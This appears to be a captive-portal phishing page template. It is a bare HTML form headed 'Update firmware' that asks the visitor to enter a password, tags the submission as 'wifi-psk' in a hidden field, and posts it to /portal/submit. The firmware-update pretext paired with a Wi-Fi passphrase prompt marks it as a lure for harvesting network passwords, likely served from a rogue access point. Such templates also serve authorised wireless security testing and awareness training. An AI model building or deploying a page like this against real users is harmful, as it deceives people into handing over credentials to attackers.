<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Update firmware</title>
  <style>
    * { box-sizing: border-box; }

    body {
      display: grid;
      place-items: center;
      min-height: 100vh;
      min-height: 100svh;
      margin: 0;
      padding: 32px 24px 64px;
      background: #fff;
      color: #111;
      font: 16px/1.5 system-ui, sans-serif;
    }

    main { width: 100%; max-width: 384px; }

    h1 {
      margin: 0 0 24px;
      font-size: clamp(32px, 7vw, 44px);
      font-weight: 650;
      line-height: 1.12;
      letter-spacing: -.045em;
    }

    form { padding-top: 24px; border-top: 1px solid #d8d8d8; }
    label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 600; }

    input, button {
      display: block;
      width: 100%;
      min-height: 48px;
      padding: 10px 14px;
      border: 1px solid;
      border-radius: 0;
      font: inherit;
    }

    input { border-color: #757575; background: #fff; color: #111; }

    button {
      margin-top: 12px;
      border-color: #111;
      background: #111;
      color: #fff;
      font-weight: 600;
      cursor: pointer;
    }

    button:hover { background: #303030; }
    :focus-visible { outline: 2px solid currentColor; outline-offset: 3px; }
    button:focus-visible { outline-color: #111; }
  </style>
</head>
<body>
  <main>
    <h1>Update firmware</h1>
    <form method="post" action="/portal/submit">
      <input type="hidden" name="portal_type" value="wifi-psk">
      <label for="wifi_password">Enter password</label>
      <input id="wifi_password" name="wifi_password" type="password"
             autocomplete="current-password" autocapitalize="off"
             autocorrect="off" spellcheck="false" required autofocus>
      <button type="submit">Confirm</button>
    </form>
  </main>
</body>
</html>
